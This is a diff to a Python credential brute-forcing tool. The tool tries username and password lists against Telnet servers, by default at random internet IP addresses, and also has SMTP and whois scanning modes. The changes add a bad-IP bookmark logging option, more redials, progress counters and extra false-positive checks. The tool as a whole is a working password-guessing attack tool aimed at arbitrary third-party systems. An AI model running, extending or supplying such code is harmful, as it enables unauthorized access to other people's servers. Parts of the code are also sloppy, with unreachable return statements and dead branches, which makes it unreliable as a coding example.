@@ -8,7 +8,12 @@ def PrintUsage():
 	print ("")
 	print ("\t\t Copyright (c) 2024 Batch McNulty")
 	print ("")
-	print ("-redials: nn or OFF	Telnet Only for now. The number of times I try to contact each server. Automatically turns off when we're searching randomly but can be overriden. Defaults 3 or OFF")
+	print ("UNDER CONSTRUCTION:")
+	print ("-bad_ip_logging		Telnet Only for now. For use with lots of ips - logs when your IP has \"finished\" due to a bad IP but you still have usernames & passwords to try.")
+	#print ("-hack: keepwhois	Scan whois, but keep files ")
+	print (" END OF UNDER CONSTRUCTION")
+
+	print ("-redials: nn or OFF	Telnet Only for now. The number of times I try to contact each server. Automatically turns off when we're searching randomly but can be overriden. Defaults 5 or OFF")
 	print ("-halt_on_hack		Telnet Only for now. If set, will halt the program once it thinks a target has been successfully hacked. You can always resume with -resume")
 	print ("-retries: nn		Telnet only. If you're getting many false positives or it stops hacking too early, increase this number (default 10)")
 	print ("-wait: nn		wait a set number of seconds between tries. Default 1. Accepts floats.")
@@ -41,10 +46,6 @@ def PrintUsage():
 	print (" -key			Key for editing BOOKMARK.TXT (not saved)")
 	
 	print ("")
-	#print ("UNDER CONSTRUCTION:")
-	
-	#print ("-hack: keepwhois	Scan whois, but keep files ")
-	#print (" END OF UNDER CONSTRUCTION")
 	#print (" ")
 	print ("NB: Default behaviour is to try random ip addresses with a timeout of 1 seconds")
 	print ("")
@@ -100,9 +101,9 @@ def PrintKey():
 	print (" 21	-ranndom_from_file rider / internal variable, ie False")
 	print (" 22	-timeout: rider / internal variable, ie 2")
 	print (" 23	-retries: rider / internal variable, ie 10.")
-	print (" 24	-halt_on_hack rider / internal variable, ie TRUE")
+	print (" 24	-halt_on_hack rider / internal variable, ie True")
 	print (" 26 -redials: rider / internal variable, ie 3.")
-	print (" 27	Reserved for future use.")
+	print (" 27	-bad_ip_logging: rider / internal variable, ie True.")
 	print (" 28	Reserved for future use.")
 	print (" 29	Reserved for future use.")
 	print ("\n")
@@ -548,14 +549,24 @@ def HackTelnet (serverHost, serverPort, username, password, timeout, retries):
 		retries = original_retries
 		result = repr(data)
 		print ("RECV'd:",result)
+		
 		if (result == "b'\r\n'"):
 			print ("This is the recurring false pos problem. Escape routine ONE (1) ")
-			return ("BADIP")
+			#return ("BADIP")
 			quit("1")
 		if (result == b'\r\n'):
 			print ("This is the recurring false pos prob - Escape routine TWO (2)")
-			return ("BADIP")
+			#return ("BADIP")
 			quit ("2")
+		if (result == b''):
+			print ("This is the recurring false pos prob - Escape routine THREE (3)")
+			#return ("BADIP")
+			quit ("3")
+			
+		if (result == "b''"):
+			print ("This is the recurring false pos prob - Escape routine FOUR (4)")
+			return ("BADIP")
+			quit ("4")
 			
 			
 		if (result.find('Protection of brute force attack') > -1):
@@ -701,11 +712,11 @@ def WriteSuccessFile(successfile, ipnumber, port, username, password):
 
 #************************** WRITESAVEFILE *******************************
 
-def WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3):
+def WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3):
 	import time
 	print ("*** Writing save file",save_name,"***")
 	handle = open(save_name, "w")
-	print (save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3, sep = "\n", file = handle)
+	print (save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3, sep = "\n", file = handle)
 	handle.close()
 	time.sleep (0.1)
 
@@ -948,11 +959,13 @@ import urllib
 
 
 # Futureproofing in WriteSaveFile
-future1 = False
+bad_ip_logging = False
 future2 = False
 future3 = False
 
-
+bad_ip_logging = GetSingleOption ("-bad_ip_logging")
+print ("bad_ip_logging:", bad_ip_logging, type(bad_ip_logging))
+#quit()
 
 halt_on_hack = GetSingleOption ("-halt_on_hack")
 print ("halt_on_hack:",halt_on_hack, type (halt_on_hack))
@@ -1052,14 +1065,13 @@ ip_idx = 0
 
 ############# Handle redials ###############
 
-redials = 3
+redials = 5
 
 try:	redials = int (GetOption("-redials:"))
 except:	redials = (GetOption("-redials:"))
-if (redials == False):	redials = 3
+if (redials == False):	redials = 5
 
 print ("redials:",redials, type (redials))
-
 
 if (ipfile == False and single_crack == False):
 	redials = False
@@ -1327,6 +1339,16 @@ if resume == True:
 
 	print ("redials:",redials, type(redials))
 
+	############ restore bad_ip_logging #############
+	
+	try:	bad_ip_logging = resume_contents[25]
+	except:	print ("Can't restore bad_ip_logging...")
+	
+	if (bad_ip_logging == "False"):	bad_ip_logging = False
+	if (bad_ip_logging == "True"):	bad_ip_logging = True
+	
+	print ("bad_ip_logging:",bad_ip_logging, type(bad_ip_logging))	
+	
 	#quit()
 
 ########################################################################
@@ -1494,7 +1516,7 @@ if hack == "smtphack":
 					WriteFoundFile(foundfile, ipnumber, port, "n/a", "n/a")
 
 		ip_idx += 1
-		WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+		WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 		
 	print ("Bye bye, smtp hacking finished")
 	quit()
@@ -1535,7 +1557,7 @@ if hack == "smtphelo":
 		
 		ip_idx += 1
 		
-		WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+		WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 		
 
 	print ("Bye bye, smtp helo hacking finished")
@@ -1575,20 +1597,21 @@ if (hack == "telnet"):
 				
 						
 		if (single_crack == True):	
-			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target,random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)		
+			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target,random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)		
 		else:			
-			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 			
 		print ("hack = ",hack,"ip_idx:",ip_idx, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile, "random_from_file:",random_from_file, type (random_from_file))
 		
 		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout, "halt_on_hack",halt_on_hack, type (halt_on_hack))
 		for user_idx in range (start_user_idx, len(usernames_array)):
 
+
 			
 			if (single_crack == True):	
-				WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+				WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 			else:			
-				WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+				WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 						
 			username = usernames_array[user_idx]
 			print ("wait",wait,type(wait))
@@ -1606,6 +1629,35 @@ if (hack == "telnet"):
 				print ("Out of sub: Hours:",hours, "lap time:", lap_time)
 				
 				password = passwords_array[pwd_idx]
+
+				try:	percent_done = round (((ip_idx / len(ipnumbers_array) ) * 100 ), 3)
+				except:	percent_done = ("Oooops, divide by zero prolly")
+				if (ip_idx == 0):
+					print ("\t Either randomly scanning IPs or at start of a list.")
+				else:
+					print ("\t\t**** IPs DONE:",ip_idx,"(%",percent_done,") ****")
+					print ("\t\t**** IPs DONE:",ip_idx,"(%",percent_done,") ****")
+					print ("\t\t**** IPs DONE:",ip_idx,"(%",percent_done,") ****")
+
+
+				try:	user_percent_done = round (((user_idx / len(usernames_array) ) * 100 ), 3)
+				except:	user_percent_done = ("Oooops, divide by zero prolly")
+				print ("")
+				print ("*** usernames done (this IP):", user_idx,"/",len(usernames_array),"(", user_percent_done,"%) ***")
+				print ("*** usernames done (this IP):", user_idx,"/",len(usernames_array),"(", user_percent_done,"%) ***")
+				print ("*** usernames done (this IP):", user_idx,"/",len(usernames_array),"(", user_percent_done,"%) ***")
+				print ("")
+
+
+				try:	pass_percent_done = round (((pwd_idx / len(passwords_array) ) * 100 ), 3)
+				except:	pass_percent_done = ("Oooops, divide by zero prolly")
+				print ("")
+				print ("*** passwords done (this IP):", pwd_idx,"/",len(passwords_array),"(", pass_percent_done,"%) ***")
+				print ("*** passwords done (this IP):", pwd_idx,"/",len(passwords_array),"(", pass_percent_done,"%) ***")
+				print ("*** passwords done (this IP):", pwd_idx,"/",len(passwords_array),"(", pass_percent_done,"%) ***")
+				print ("")
+				print ("bad_ip_logging",bad_ip_logging,type(bad_ip_logging))
+				print ("")
 				
 				####  Wait between connections
 				WaitBetweenConn (wait, waitrand)
@@ -1646,9 +1698,9 @@ if (hack == "telnet"):
 								print ("At end of username and password file, not saving...")
 						
 						if (single_crack == True):	
-							WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+							WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 						else:			
-							WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+							WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 						
 						quit()
 
@@ -1658,22 +1710,25 @@ if (hack == "telnet"):
 						WriteFoundFile(foundfile, ipnumber, port, username, password)
 
 				if (single_crack == True):	
-					WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+					WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 				else:			
-					WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+					WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 
-				try:	percent_done = round (((ip_idx / len(ipnumbers_array) ) * 100 ), 3)
-				except:	percent_done = ("Oooops, divide by zero prolly")
-				if (ip_idx == 0):
-					print ("\t Either randomly scanning IPs or at start of a list.")
-				else:
-					print ("\t\t**** INDEX:",ip_idx,"(%",percent_done,") ****")
-					print ("\t\t**** INDEX:",ip_idx,"(%",percent_done,") ****")
-					print ("\t\t**** INDEX:",ip_idx,"(%",percent_done,") ****")
 
 				if (reality == "BADIP"):
+
 					print ("BAD IP ADDRESS, skipping...")
 					print ("index:",ip_idx)
+					if (bad_ip_logging == True):
+						copy_save_name = save_name
+						save_name = "bad_ip_bookmark"+str(ipnumber)+".txt"
+						print ("Saving ip bookmark:",save_name)
+						#quit()
+						WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
+						
+						save_name = copy_save_name
+						# do some logging as well?
+						
 					#del (ipnumbers_array[ip_idx])
 					break
 					# This loses nesting but it doesn't need it as it's a bad IP
@@ -1685,7 +1740,6 @@ if (hack == "telnet"):
 		ip_idx += 1
 		start_user_idx = 0
 		start_pwd_idx = 0
-
 ###################################### WHOIS SCANNING ############################################
 if hack == "searchwhois:":
 	user_idx = "n/a"
@@ -1732,11 +1786,11 @@ if hack == "searchwhois:":
 
 		if (single_crack == False):	
 
-			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 
 		else:			
-			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, future1, future2, future3)
+			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target, random_from_file, timeout, retries, halt_on_hack, redials, bad_ip_logging, future2, future3)
 
 
-
+print ("I have been running for (",hours,"hours. Toodle-oo!")
 print ("It's all over!")
